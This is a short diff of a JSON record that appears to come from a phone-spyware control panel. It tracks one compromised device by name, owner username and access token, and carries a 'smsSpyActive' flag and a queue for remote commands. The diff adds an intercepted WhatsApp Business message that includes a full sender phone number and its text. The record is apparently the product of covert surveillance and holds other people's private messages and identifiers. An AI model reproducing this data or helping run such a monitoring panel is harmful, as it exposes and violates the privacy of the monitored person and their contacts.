@@ -4,7 +4,7 @@
     "deviceName": "HP-ZAL7SEX-DE66",
     "ownerUsername": "Zal7Sex",
     "token": "3e96d18457563327d60d61c9ae4038ef",
-    "lastSeen": 1777568397145,
+    "lastSeen": 1777568406235,
     "commandQueue": [],
     "online": true,
     "connectedAt": "2026-04-30T16:56:12.521Z",
@@ -20,6 +20,14 @@
     "lastScreenFrame": null,
     "smsSpyActive": true,
     "smsMessages": [
+      {
+        "appName": "WA Business",
+        "sender": "+62 838-2463-4203",
+        "content": "Berapa harga bg",
+        "time": "01/05 00:00",
+        "pkg": "com.whatsapp.w4b",
+        "receivedAt": 1777568408668
+      },
       {
         "appName": "WA Business",
         "sender": "WhatsApp Business",
